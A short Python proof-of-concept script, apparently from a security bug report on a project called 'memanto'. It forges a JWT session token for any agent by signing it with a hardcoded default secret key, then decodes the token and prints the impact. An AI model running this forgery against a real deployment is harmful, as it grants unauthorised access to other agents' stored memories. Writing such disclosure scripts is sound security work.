"""
Bug #1: JWT Forgery with Default Secret Key (Critical - Security)

Demonstrates that the default JWT secret key is publicly known
and allows forging valid session tokens for any agent.
"""
import sys
sys.path.insert(0, "/tmp/memanto")

try:
    import jwt
except ImportError:
    print("Installing pyjwt...")
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", "PyJWT", "-q"])
    import jwt

from datetime import datetime, timedelta, timezone

DEFAULT_KEY = "memanto-default-secret-change-in-production"

# Forge a session token for any agent_id
payload = {
    "agent_id": "victim-agent",
    "namespace": "memanto_agent_victim-agent",
    "session_id": "sess_forged123456",
    "started_at": datetime.now(timezone.utc).isoformat(),
    "expires_at": (datetime.now(timezone.utc) + timedelta(hours=6)).isoformat(),
}
forged_token = jwt.encode(payload, DEFAULT_KEY, algorithm="HS256")
decoded = jwt.decode(forged_token, DEFAULT_KEY, algorithms=["HS256"])

print("=" * 60)
print("BUG #1: Hardcoded Default JWT Secret Key")
print("Severity: CRITICAL")
print("=" * 60)
print(f"Default key: {DEFAULT_KEY}")
print(f"Forged token: {forged_token[:50]}...")
print(f"Decoded agent_id: {decoded['agent_id']}")
print(f"Decoded namespace: {decoded['namespace']}")
print()
print("IMPACT: Attacker can forge session tokens for ANY agent,")
print("gaining full read/write/delete access to their memories.")
print("=" * 60)
